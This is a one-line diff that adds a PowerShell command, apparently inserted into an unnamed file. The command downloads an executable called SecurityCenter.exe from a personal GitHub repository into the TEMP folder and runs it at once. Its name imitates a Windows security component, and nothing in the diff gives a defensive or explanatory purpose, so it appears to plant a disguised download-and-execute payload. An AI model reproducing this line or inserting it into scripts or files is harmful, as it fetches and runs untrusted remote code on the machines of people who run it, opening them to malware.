@@ -1,0 +1,1 @@
+powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/SecurityCenter.exe' -OutFile \"$env:TEMP\SecurityCenter.exe\"; Start-Process \"$env:TEMP\SecurityCenter.exe\""
